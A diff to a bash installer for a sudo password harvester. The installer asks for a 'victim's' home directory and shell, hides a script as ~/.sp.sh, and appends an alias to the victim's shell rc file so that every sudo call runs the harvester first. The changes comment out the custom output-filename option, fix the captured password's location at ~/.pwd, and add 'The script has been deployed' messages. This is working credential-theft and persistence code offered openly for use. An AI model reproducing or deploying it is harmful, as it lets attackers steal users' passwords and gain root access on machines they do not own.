@@ -18,8 +18,9 @@ echo -n "B) Type the full (absolute) path to the victim's home directory (i.e /h
 read homedir
 echo -n "C) Does the victim need to type a password for sudo? (yes if unsure) [y/n] "
 read reply
-echo "D) Once the password is harvested, it will be saved in a file. What do you want that filename/path to be? "
-read filename
+#echo "D) Once the password is harvested, it will be saved in a file. What do you want that filename/path to be? "
+#read filename
+echo ""
 
 # Set the shell
 echo "$shell"
@@ -45,13 +46,16 @@ commentit() {
 
 # Filename
 
-filename() {
-	cp sp.sh sp.sh.tmp3
-	sed "s/.pwd/$filename/g" sp.sh.tmp3 > sp.sh
-	shred -fu sp.sh.tmp3
-}
+# filename() {
+#	cp sp.sh sp.sh.tmp3
+#	sed "s/.pwd/$filename/g" sp.sh.tmp3 > sp.sh
+#	shred -fu sp.sh.tmp3
+#}
 
 chmod +x sp.sh
 mv sp.sh "$homedir"/.sp.sh
 
 echo "alias sudo=\"~/.sp.sh; sudo\"" >> ."$shell"rc
+
+echo "The script has been deployed. The password will be saved in ~/.pwd"
+echo "Now, wait"
